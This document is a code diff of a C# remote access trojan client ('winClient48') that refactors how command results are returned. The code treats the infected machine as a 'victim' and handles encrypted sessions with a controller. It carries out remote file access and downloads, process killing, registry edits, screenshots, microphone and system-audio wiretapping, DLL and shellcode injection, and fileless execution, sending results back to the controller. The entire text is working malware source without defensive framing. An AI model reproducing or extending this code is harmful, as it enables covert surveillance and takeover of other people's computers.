@@ -365,15 +365,15 @@ namespace winClient48
                                     string szRsaPublicKeyXml = clsCrypto.b64D2Str(dsp.GetMsg().msg); //XML FORMAT
                                     szRsaPublicKeyXml = clsCrypto.b64D2Str(szRsaPublicKeyXml); //Base64 decoding.
 
-                                    v.key_pairs.public_key = szRsaPublicKeyXml; //Store RSA public key into victim object.
+                                    v.key_pairs.szPubKey = szRsaPublicKeyXml; //Store RSA public key into victim object.
 
                                     var objAes = clsCrypto.AES_GenerateKeyAndIV(); //Generate new AES key and IV (initial vector).
 
                                     byte[] abAesKey = Convert.FromBase64String(objAes.key); //AES key.
                                     byte[] abAesIv = Convert.FromBase64String(objAes.iv); //AES IV.
 
-                                    v._AES.key = abAesKey;
-                                    v._AES.iv = abAesIv;
+                                    v._AES.abKey = abAesKey;
+                                    v._AES.abIV = abAesIv;
 
                                     string szPayload = objAes.key + "|" + objAes.iv;
 
@@ -386,9 +386,9 @@ namespace winClient48
                                     byte[] buffer = dsp.GetMsg().msg;
                                     string payload = Encoding.UTF8.GetString(buffer);
                                     buffer = Convert.FromBase64String(payload);
-                                    payload = clsCrypto.AESDecrypt(buffer, v._AES.key, v._AES.iv);
-                                    payload = Convert.ToBase64String(clsCrypto.RSAEncrypt(payload, v.key_pairs.public_key));
-                                    payload = clsCrypto.AESEncrypt(payload, v._AES.key, v._AES.iv);
+                                    payload = clsCrypto.AESDecrypt(buffer, v._AES.abKey, v._AES.abIV);
+                                    payload = Convert.ToBase64String(clsCrypto.RSAEncrypt(payload, v.key_pairs.szPubKey));
+                                    payload = clsCrypto.AESEncrypt(payload, v._AES.abKey, v._AES.abIV);
 
                                     v.Send(1, 3, payload);
                                 }
@@ -404,7 +404,7 @@ namespace winClient48
                                     try
                                     {
                                         string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
-                                        payload = clsCrypto.AESDecrypt(Convert.FromBase64String(payload), v._AES.key, v._AES.iv);
+                                        payload = clsCrypto.AESDecrypt(Convert.FromBase64String(payload), v._AES.abKey, v._AES.abIV);
 
                                         Task.Run(() =>
                                         {
@@ -593,10 +593,10 @@ namespace winClient48
                             {
                                 string rsa_publicKey = clsCrypto.b64D2Str(dsp.GetMsg().msg); //XML FORMAT
                                 rsa_publicKey = clsCrypto.b64D2Str(rsa_publicKey);
-                                victim.key_pairs.public_key = rsa_publicKey;
+                                victim.key_pairs.szPubKey = rsa_publicKey;
                                 var aes = clsCrypto.AES_GenerateKeyAndIV();
-                                victim._AES.key = Convert.FromBase64String(aes.key);
-                                victim._AES.iv = Convert.FromBase64String(aes.iv);
+                                victim._AES.abKey = Convert.FromBase64String(aes.key);
+                                victim._AES.abIV = Convert.FromBase64String(aes.iv);
                                 string payload = aes.key + "|" + aes.iv;
                                 byte[] enc_payload = clsCrypto.RSAEncrypt(payload, rsa_publicKey);
 
@@ -608,9 +608,9 @@ namespace winClient48
                                 byte[] buffer = dsp.GetMsg().msg;
                                 string payload = Encoding.UTF8.GetString(buffer);
                                 buffer = Convert.FromBase64String(payload);
-                                payload = clsCrypto.AESDecrypt(buffer, victim._AES.key, victim._AES.iv);
-                                payload = Convert.ToBase64String(clsCrypto.RSAEncrypt(payload, victim.key_pairs.public_key));
-                                payload = clsCrypto.AESEncrypt(payload, victim._AES.key, victim._AES.iv);
+                                payload = clsCrypto.AESDecrypt(buffer, victim._AES.abKey, victim._AES.abIV);
+                                payload = Convert.ToBase64String(clsCrypto.RSAEncrypt(payload, victim.key_pairs.szPubKey));
+                                payload = clsCrypto.AESEncrypt(payload, victim._AES.abKey, victim._AES.abIV);
                                 victim.fnHttpSend(1, 3, payload);
                             }
                             else if (dsp.Param == 4)
@@ -625,7 +625,7 @@ namespace winClient48
                                 try
                                 {
                                     string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
-                                    payload = clsCrypto.AESDecrypt(Convert.FromBase64String(payload), victim._AES.key, victim._AES.iv);
+                                    payload = clsCrypto.AESDecrypt(Convert.FromBase64String(payload), victim._AES.abKey, victim._AES.abIV);
 
                                     Task.Run(() => _Received(victim, payload));
                                 }
@@ -905,10 +905,10 @@ namespace winClient48
                         int file_limit = int.Parse(cmd[4]);
                         var val = funcFile.ScanDir(dir, dir_limit, file_limit);
 
-                        int code = val.Item1;
-                        string szRet = val.Item2;
-                        List<string[]> l_dir = val.Item3;
-                        List<string[]> l_file = val.Item4;
+                        int code = val.nCode;
+                        string szRet = val.szMsg;
+                        List<string[]> l_dir = val.lsDir;
+                        List<string[]> l_file = val.lsFile;
 
                         string data = string.Join("*", l_dir.Select(x => string.Join(";", x))) + "|" + string.Join("*", l_file.Select(x => string.Join(";", x))); //funcFile.ScanDir(dir, dir_limit, file_limit);
                         if (data.Contains("|"))
@@ -926,7 +926,7 @@ namespace winClient48
                     else if (cmd[1] == "goto") //GOTO DIRECTORY
                     {
                         var x = funcFile.Goto(clsCrypto.b64D2Str(cmd[2]));
-                        v.SendCommand($"file|goto|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                        v.SendCommand($"file|goto|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
                     }
                     else if (cmd[1] == "read")
                     {
@@ -1023,7 +1023,7 @@ namespace winClient48
                         string[] files = cmd[3].Split(',').Select(x => clsCrypto.b64D2Str(x)).ToArray();
                         string archiveName = cmd[4];
 
-                        (List<string[]> dInfo, List<string[]> fInfo) = funcFile.Archive_Compress(folders, files, archiveName);
+                        var result = funcFile.Archive_Compress(folders, files, archiveName);
 
                         v.SendCommand(string.Join("|", new string[]
                         {
@@ -1032,13 +1032,13 @@ namespace winClient48
 
                             //Folder State.
                             string.Join(",",
-                                dInfo.Select(x => $"{clsCrypto.b64E2Str(x[0])}|{x[1]}")
+                                result.lsFolderInfo.Select(x => $"{clsCrypto.b64E2Str(x[0])}|{x[1]}")
                                 .Select(x => clsCrypto.b64E2Str(x)).ToArray()
                             ),
 
                             //File State.
                             string.Join(",",
-                                fInfo.Select(x => $"{clsCrypto.b64E2Str(x[0])}|{x[1]}")
+                                result.lsFileInfo.Select(x => $"{clsCrypto.b64E2Str(x[0])}|{x[1]}")
                                 .Select(x => clsCrypto.b64E2Str(x)).ToArray()
                             ),
 
@@ -1089,15 +1089,16 @@ namespace winClient48
                         bool bIgnoreCase = int.Parse(cmd[5]) == 1;
                         int itemType = int.Parse(cmd[6]);
 
-                        List<(string, string)> results = funcFile.Find(paths, patterns, method, bIgnoreCase, itemType);
+                        var result = funcFile.Find(paths, patterns, method, bIgnoreCase, itemType);
 
                         //Generate Payload
-                        results = results.Select(x => (x.Item1, clsCrypto.b64E2Str(x.Item2))).ToList();
+                        //result = result.Select(x => (x.szType, clsCrypto.b64E2Str(x.szPath))).ToList();
+                        result = result.Select(x => new clsRetFileFind { szType = x.szType, szPath = clsCrypto.b64E2Str(x.szPath) }).ToList();
                         v.SendCommand(string.Join("|", new string[]
                         {
                             "file",
                             "find",
-                            string.Join(";", results.Select(x => $"{x.Item1},{x.Item2}").ToArray()),
+                            string.Join(";", result.Select(x => $"{x.szType},{x.szPath}").ToArray()),
                         }));
                     }
                     else if (cmd[1] == "wget")
@@ -1106,7 +1107,7 @@ namespace winClient48
                         string szCurrentDir = clsCrypto.b64D2Str(cmd[3]);
                         var x = funcFile.Wget(v, szUrl, szCurrentDir);
 
-                        v.SendCommand($"file|wget|status|{cmd[2]}|{clsCrypto.b64E2Str(x.Item3)}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                        v.SendCommand($"file|wget|status|{cmd[2]}|{clsCrypto.b64E2Str(x.szSaveFileName)}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
                     }
                     else if (cmd[1] == "ts") //File Timestamp
                     {
@@ -1153,58 +1154,58 @@ namespace winClient48
 
                         var x = funcTask.Start(szFileName, szArgv, szWorkDir);
 
-                        v.SendCommand($"task|start|{cmd[2]}|{cmd[3]}|{cmd[4]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                        v.SendCommand($"task|start|{cmd[2]}|{cmd[3]}|{cmd[4]}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
                     }
                     else if (cmd[1] == "kill")
                     {
                         int[] pids = cmd[2].Split(',').Where(x => !string.IsNullOrEmpty(x)).Select(x => int.Parse(x)).ToArray();
-                        List<(int, int, string)> lsResult = new List<(int, int, string)>();
+                        List<clsRetTask> lsResult = new List<clsRetTask>();
                         foreach (int pid in pids)
                         {
                             var x = funcTask.Kill(pid);
-                            lsResult.Add((pid, x.Item1, x.Item2));
+                            lsResult.Add(new clsRetTask { nPid = pid, nCode = x.nCode, szMsg = x.szMsg });
                         }
 
-                        string payload = string.Join(";", lsResult.Select(x => $"{x.Item1},{x.Item2},{clsCrypto.b64E2Str(x.Item3)}"));
+                        string payload = string.Join(";", lsResult.Select(x => $"{x.nPid},{x.nCode},{clsCrypto.b64E2Str(x.szMsg)}"));
                         v.SendCommand($"task|kill|{payload}");
                     }
                     else if (cmd[1] == "kd") //KILL & DELETE
                     {
                         int[] pids = cmd[2].Split(',').Where(x => !string.IsNullOrEmpty(x)).Select(x => int.Parse(x)).ToArray();
-                        List<(int, int, string)> lsResult = new List<(int, int, string)>();
+                        List<clsRetTask> lsResult = new List<clsRetTask>();
                         foreach (int pid in pids)
                         {
                             var x = funcTask.KillDelete(pid);
-                            lsResult.Add((pid, x.Item1, x.Item2));
+                            lsResult.Add(new clsRetTask { nPid = pid, nCode = x.nCode, szMsg = x.szMsg });
                         }
 
-                        string payload = string.Join(";", lsResult.Select(x => $"{x.Item1},{x.Item2},{clsCrypto.b64E2Str(x.Item3)}"));
+                        string payload = string.Join(";", lsResult.Select(x => $"{x.nPid},{x.nCode},{clsCrypto.b64E2Str(x.szMsg)}"));
                         v.SendCommand($"task|resume|{payload}");
                     }
                     else if (cmd[1] == "resume")
                     {
                         int[] pids = cmd[2].Split(',').Where(x => !string.IsNullOrEmpty(x)).Select(x => int.Parse(x)).ToArray();
-                        List<(int, int, string)> lsResult = new List<(int, int, string)>();
+                        List<clsRetTask> lsResult = new List<clsRetTask>();
                         foreach (int pid in pids)
                         {
                             var x = funcTask.Resume(pid);
-                            lsResult.Add((pid, x.Item1, x.Item2));
+                            lsResult.Add(new clsRetTask { nPid = pid, nCode = x.nCode, szMsg = x.szMsg });
                         }
 
-                        string payload = string.Join(";", lsResult.Select(x => $"{x.Item1},{x.Item2},{clsCrypto.b64E2Str(x.Item3)}"));
+                        string payload = string.Join(";", lsResult.Select(x => $"{x.nPid},{x.nCode},{clsCrypto.b64E2Str(x.szMsg)}"));
                         v.SendCommand($"task|resume|{payload}");
                     }
                     else if (cmd[1] == "suspend")
                     {
                         int[] pids = cmd[2].Split(',').Where(x => !string.IsNullOrEmpty(x)).Select(x => int.Parse(x)).ToArray();
-                        List<(int, int, string)> lsResult = new List<(int, int, string)>();
+                        List<clsRetTask> lsResult = new List<clsRetTask>();
                         foreach (int pid in pids)
                         {
                             var x = funcTask.Suspend(pid);
-                            lsResult.Add((pid, x.Item1, x.Item2));
+                            lsResult.Add(new clsRetTask { nPid = pid, nCode = x.nCode, szMsg = x.szMsg });
                         }
 
-                        string payload = string.Join(";", lsResult.Select(x => $"{x.Item1},{x.Item2},{clsCrypto.b64E2Str(x.Item3)}"));
+                        string payload = string.Join(";", lsResult.Select(x => $"{x.nPid},{x.nCode},{clsCrypto.b64E2Str(x.szMsg)}"));
                         v.SendCommand($"task|suspend|{payload}");
                     }
                 }
@@ -1238,13 +1239,13 @@ namespace winClient48
                         if (cmd[2] == "key")
                         {
                             var x = funcReg.AddNewKey(regFullPath, itemName);
-                            v.SendCommand($"reg|add|key|{x.Item1}|{x.Item2}");
+                            v.SendCommand($"reg|add|key|{x.nCode}|{x.szMsg}");
                         }
                         else if (cmd[2] == "val")
                         {
                             RegistryValueKind kind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), cmd[5]);
                             var result = funcReg.AddNewValue(regFullPath, itemName, kind);
-                            v.SendCommand($"reg|add|val|{result.Item1}|{result.Item2}");
+                            v.SendCommand($"reg|add|val|{result.nCode}|{result.szMsg}");
                         }
                     }
                     else if (cmd[1] == "rename")
@@ -1256,12 +1257,12 @@ namespace winClient48
                         if (cmd[2] == "key")
                         {
                             var x = funcReg.RenameKey(srcPath, dstPath);
-                            v.SendCommand($"reg|rename|key|{x.Item1}|{x.Item2}");
+                            v.SendCommand($"reg|rename|key|{x.nCode}|{x.szMsg}");
                         }
                         else if (cmd[2] == "val")
                         {
                             var x = funcReg.RenameValue(regFullPath, srcPath, dstPath);
-                            v.SendCommand($"reg|rename|val|{x.Item1}|{x.Item2}");
+                            v.SendCommand($"reg|rename|val|{x.nCode}|{x.szMsg}");
                         }
                     }
                     else if (cmd[1] == "edit") //Edit Key
@@ -1271,7 +1272,7 @@ namespace winClient48
                         RegistryValueKind valKind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), cmd[4]);
                         string szValData = cmd[4];
                         object objValData = null;
-                        var x = (0, "");
+                        clsRetValue x = null;
 
                         switch (valKind)
                         {
@@ -1297,14 +1298,14 @@ namespace winClient48
 
                         if (objValData == null)
                         {
-                            x.Item2 = clsCrypto.b64E2Str("objValData is null.");
+                            x.szMsg = clsCrypto.b64E2Str("objValData is null.");
                         }
                         else
                         {
                             x = funcReg.EditValue(regFullPath, valName, objValData);
                         }
 
-                        v.SendCommand($"reg|edit|{regFullPath}|{valName}|{x.Item1}|{x.Item2}");
+                        v.SendCommand($"reg|edit|{regFullPath}|{valName}|{x.nCode}|{x.szMsg}");
                     }
                     else if (cmd[1] == "find")
                     {
@@ -1315,13 +1316,13 @@ namespace winClient48
                         int dwType = int.Parse(cmd[6]); //0: Key, 1: Value, 2: Both.
                         RegistryValueKind kind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), cmd[7]);
 
-                        List<(string, string, string)> x = funcReg.Find(regFullPaths, patterns, method, bIgnoreCase, dwType, kind);
+                        List<clsRegFind> x = funcReg.Find(regFullPaths, patterns, method, bIgnoreCase, dwType, kind);
 
                         string payload = string.Join(",",
                             x.Select(y =>
-                            $"{y.Item1};" + //Type: k(key), v(value)
-                            $"{clsCrypto.b64E2Str(y.Item2)};" + //Name(for key, same as path)
-                            $"{clsCrypto.b64E2Str(y.Item3)}" //Path
+                            $"{y.szType};" + //Type: k(key), v(value)
+                            $"{clsCrypto.b64E2Str(y.szName)};" + //Name(for key, same as path)
+                            $"{clsCrypto.b64E2Str(y.szKeyName)}" //Path
                         ).ToArray());
 
                         v.SendCommand($"reg|find|{payload}");
@@ -1333,7 +1334,7 @@ namespace winClient48
                         if (cmd[2] == "key")
                         {
                             var x = funcReg.DeleteKey(regFullPath);
-                            v.SendCommand($"reg|del|key|{x.Item1}|{x.Item2}");
+                            v.SendCommand($"reg|del|key|{x.nCode}|{x.szMsg}");
                         }
                         else if (cmd[2] == "val")
                         {
@@ -1344,7 +1345,7 @@ namespace winClient48
                             foreach (string valName in valNames)
                             {
                                 var x = funcReg.DeleteValue(regFullPath, valName);
-                                sb.Append($"{valName},{x.Item1},{clsCrypto.b64E2Str(x.Item2)};");
+                                sb.Append($"{valName},{x.nCode},{clsCrypto.b64E2Str(x.szMsg)};");
                             }
 
                             v.SendCommand($"reg|del|val|{cmd[3]}|{sb.ToString()}");
@@ -1356,7 +1357,7 @@ namespace winClient48
                         string servPath = clsCrypto.b64D2Str(cmd[3]);
 
                         var x = funcReg.Export(regFullPath, servPath);
-                        v.SendCommand($"reg|export|{x.Item1}|{x.Item2}|{cmd[3]}");
+                        v.SendCommand($"reg|export|{x.nCode}|{x.szMsg}|{cmd[3]}");
                     }
                     else if (cmd[1] == "import")
                     {
@@ -1368,7 +1369,7 @@ namespace winClient48
                         if (File.Exists(tmpFile))
                             File.Delete(tmpFile);
 
-                        v.SendCommand($"reg|import|{x.Item1}|{x.Item2}");
+                        v.SendCommand($"reg|import|{x.nCode}|{x.szMsg}");
                     }
                 }
                 #endregion
@@ -1422,9 +1423,9 @@ namespace winClient48
                         var x = funcWindow.GetWindow();
 
                         string payload = string.Empty;
-                        if (x.Item1 == 1)
+                        if (x.nCode == 1)
                         {
-                            List<WindowInfo> lsResult = x.Item3;
+                            List<WindowInfo> lsResult = x.lsWindow;
                             payload = string.Join(";", lsResult.Select(s =>
                                 string.Join(",", new string[]
                                 {
@@ -1438,7 +1439,7 @@ namespace winClient48
                             ));
                         }
 
-                        v.SendCommand($"window|init|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}|{payload}");
+                        v.SendCommand($"window|init|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}|{payload}");
                     }
                     else if (cmd[1] == "shot")
                     {
@@ -1446,12 +1447,12 @@ namespace winClient48
                         if (cmd[2] == "api") //DC
                         {
                             var x = funcWindow.CaptureWindowWithAPI(hWnd);
-                            v.SendCommand($"window|shot|{cmd[3]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}|{(x.Item3 == null ? string.Empty : clsGlobal.ImageToBase64(x.Item3))}");
+                            v.SendCommand($"window|shot|{cmd[3]}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}|{(x.bmp == null ? string.Empty : clsGlobal.ImageToBase64(x.bmp))}");
                         }
                         else if (cmd[2] == "fore")
                         {
                             var x = funcWindow.CaptureWindowWithFore(hWnd);
-                            v.SendCommand($"window|shot|{cmd[3]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}|{(x.Item3 == null ? string.Empty : clsGlobal.ImageToBase64(x.Item3))}");
+                            v.SendCommand($"window|shot|{cmd[3]}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}|{(x.bmp == null ? string.Empty : clsGlobal.ImageToBase64(x.bmp))}");
                         }
                     } 
                 }
@@ -1485,8 +1486,8 @@ namespace winClient48
                         if (cmd[2] == "init")
                         {
                             var s = funcSystem.GetEnvironmentVariables();
-                            string payload = string.Join(";", s.Item3.Select(x => $"{x.Item1},{x.Item2},{clsCrypto.b64E2Str(x.Item3)}"));
-                            v.SendCommand($"system|ev|init|{s.Item1}|{clsCrypto.b64E2Str(s.Item2)}|{payload}");
+                            string payload = string.Join(";", s.lsItems.Select(x => $"{x.szKey},{x.target},{clsCrypto.b64E2Str(x.szValue)}"));
+                            v.SendCommand($"system|ev|init|{s.nCode}|{clsCrypto.b64E2Str(s.szMsg)}|{payload}");
                         }
                         else if (cmd[2] == "set")
                         {
@@ -1494,7 +1495,7 @@ namespace winClient48
                             EnvironmentVariableTarget target = (EnvironmentVariableTarget)Enum.Parse(typeof(EnvironmentVariableTarget), cmd[4]);
                             string szVals = clsCrypto.b64D2Str(cmd[5]);
                             var x = funcSystem.SetEnvironmentVariables(szName, target, szVals);
-                            v.SendCommand($"system|ev|set|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                            v.SendCommand($"system|ev|set|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
                         }
                     }
                     else if (cmd[1] == "device")
@@ -1508,21 +1509,21 @@ namespace winClient48
                         else if (cmd[2] == "enable") //ENABLE, DISABLE
                         {
                             var x = funcSystem.DeviceEnable(cmd[3], bool.Parse(cmd[4]));
-                            v.SendCommand($"system|device|{cmd[2]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                            v.SendCommand($"system|device|{cmd[2]}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
                         }
                         else if (cmd[2] == "info")
                         {
                             string szDeviceName = clsCrypto.b64D2Str(cmd[3]);
                             var x = funcSystem.DeviceGetInfo(szDeviceName);
-                            clsfnSystem.DeviceInfo info = x.Item3;
+                            clsfnSystem.DeviceInfo info = x.device;
 
                             string payload = string.Join("|", new string[]
                             {
                                 "system",
                                 "device",
                                 "info",
-                                x.Item1.ToString(),
-                                clsCrypto.b64E2Str(x.Item2),
+                                x.nCode.ToString(),
+                                clsCrypto.b64E2Str(x.szMsg),
 
                                 string.Join(",", new string[]
                                 {
@@ -2046,19 +2047,19 @@ namespace winClient48
                         {
                             Image img = clsEZData.fnBase64ToImage(cmd[3]);
                             var x = funcFun.SetWallpaper(img);
-                            v.SendCommand($"fun|wp|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                            v.SendCommand($"fun|wp|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
                         }
                         else if (cmd[2] == "get")
                         {
                             var x = funcFun.GetWallpaper();
-                            string szB64Img = x.Item3 == null ? string.Empty : clsGlobal.BitmapToBase64((Bitmap)x.Item3);
+                            string szB64Img = x.img == null ? string.Empty : clsGlobal.BitmapToBase64((Bitmap)x.img);
 
-                            v.SendCommand($"fun|wp|get|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}|{szB64Img}");
+                            v.SendCommand($"fun|wp|get|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}|{szB64Img}");
                         }
                     }
                     else if (cmd[1] == "mouse")
                     {
-                        var x = (0, "");
+                        clsRetValue x = null;
                         
                         if (cmd[2] == "hide")
                         {
@@ -2315,19 +2316,19 @@ namespace winClient48
                             if (cmd[4] == "start")
                             {
                                 var x = funcMicAudio.StartWiretapping(cmd[5], int.Parse(cmd[6]));
-                                v.SendCommand($"wiretap|system|start|{cmd[6]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                                v.SendCommand($"wiretap|system|start|{cmd[6]}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
                             }
                             else if (cmd[4] == "stop")
                             {
                                 var x = funcMicAudio.StopWiretapping(cmd[5], int.Parse(cmd[6]));
-                                v.SendCommand($"wiretap|system|stop|{cmd[6]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                                v.SendCommand($"wiretap|system|stop|{cmd[6]}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
                             }
                             else if (cmd[4] == "write")
                             {
                                 string szMp3FileName = clsCrypto.b64D2Str(cmd[6]);
                                 var x = cmd[5] == "1" ? funcMicAudio.StartSysRecord(szMp3FileName, bOffline) : funcMicAudio.StopSysRecord();
 
-                                v.SendCommand($"audio|wiretap|system|mp3|path|{cmd[5]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                                v.SendCommand($"audio|wiretap|system|mp3|path|{cmd[5]}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
                             }
                         }
                         else if (cmd[2] == "micro") //MICROPHONE
@@ -2335,19 +2336,19 @@ namespace winClient48
                             if (cmd[4] == "start")
                             {
                                 var x = funcMicAudio.StartWiretapping(cmd[5], int.Parse(cmd[6]));
-                                v.SendCommand($"wiretap|micro|start|{cmd[6]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                                v.SendCommand($"wiretap|micro|start|{cmd[6]}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
                             }
                             else if (cmd[4] == "stop")
                             {
                                 var x = funcMicAudio.StopWiretapping(cmd[5], int.Parse(cmd[6]));
-                                v.SendCommand($"wiretap|micro|stop|{cmd[6]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                                v.SendCommand($"wiretap|micro|stop|{cmd[6]}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
                             }
                             else if (cmd[4] == "write")
                             {
                                 string szMp3FileName = clsCrypto.b64D2Str(cmd[6]);
                                 var x = cmd[5] == "1" ? funcMicAudio.StartMicRecord(szMp3FileName, bOffline) : funcMicAudio.StopMicRecord();
 
-                                v.SendCommand($"audio|wiretap|micro|mp3|path|{cmd[5]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
+                                v.SendCommand($"audio|wiretap|micro|mp3|path|{cmd[5]}|{x.nCode}|{clsCrypto.b64E2Str(x.szMsg)}");
                             }
                         }
                     }
@@ -2476,7 +2477,7 @@ namespace winClient48
                         {
                             _ = Task.Run(async () =>
                             {
-                                (int nCode, string szMsg) ret = (0, string.Empty);
+                                clsRetValue ret = new clsRetValue();
 
                                 try
                                 {
@@ -2531,8 +2532,8 @@ namespace winClient48
                         int nMethod = int.Parse(cmd[3]);
                         string szDllFileName = cmd[4];
                         byte[] abDllBytes = Convert.FromBase64String(cmd[5]);
-                        
-                        (int nCode, string szMsg) ret = (0, string.Empty);
+
+                        clsRetValue ret = null;
 
                         switch (nMethod)
                         {
@@ -2589,8 +2590,8 @@ namespace winClient48
                         int nProcId = int.Parse(cmd[2]);
                         int nMethod = int.Parse(cmd[3]);
                         byte[] abShellcode = Convert.FromBase64String(cmd[4]);
-                        
-                        (int nCode, string szMsg) ret = (0, string.Empty);
+
+                        clsRetValue ret = null;
 
                         switch (nMethod)
                         {
@@ -2774,7 +2775,7 @@ namespace winClient48
 
                 else if (cmd[0] == "fle") //Fileless Execution
                 {
-                    (int nCode, string szMsg) ret = (0, string.Empty);
+                    clsRetValue ret = new clsRetValue();
 
                     if (cmd[1] == "init")
                     {
